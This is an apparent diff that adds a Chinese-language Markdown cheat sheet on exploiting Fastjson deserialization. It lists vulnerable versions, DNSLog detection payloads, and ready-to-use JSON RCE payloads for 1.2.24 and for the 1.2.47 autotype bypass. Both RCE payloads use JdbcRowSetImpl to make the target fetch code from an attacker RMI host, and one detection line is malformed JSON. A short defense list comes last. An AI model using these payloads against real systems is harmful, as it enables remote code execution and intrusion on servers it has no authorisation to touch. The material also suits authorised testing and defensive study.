@@ -1,0 +1,52 @@
+# Fastjson 漏洞利用
+
+## 基础概念
+Fastjson 是阿里巴巴的 JSON 解析库，autotype 特性可导致反序列化 RCE。
+
+## 漏洞版本
+```
+1.2.24 及之前 → 默认开启 autotype（经典 RCE）
+1.2.25-1.2.47 → 需绕过 checkAutoType（部分版本有绕过）
+1.2.68 及之后 → 需要特定条件下利用（需要 groovy/xbean 依赖）
+```
+
+## 检测方式（DNSLog）
+```json
+// 出网检测
+{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
+
+// 带外检测
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.cn"}}
+```
+
+## 1.2.24 RCE Payload
+```json
+{
+  "@type":"com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName":"rmi://vps:1099/Exploit",
+  "autoCommit":true
+}
+```
+
+## 1.2.47 绕过
+```json
+{
+  "a":{
+    "@type":"java.lang.Class",
+    "val":"com.sun.rowset.JdbcRowSetImpl"
+  },
+  "b":{
+    "@type":"com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName":"rmi://vps:1099/Exploit",
+    "autoCommit":true
+  }
+}
+```
+
+## 防御
+```
+1. 升级 Fastjson 到最新版本（≥1.2.83）
+2. 配置 safemode：ParserConfig.getGlobalInstance().setSafeMode(true);
+3. 使用 Jackson 替代 Fastjson
+4. 禁用 autotype
+```
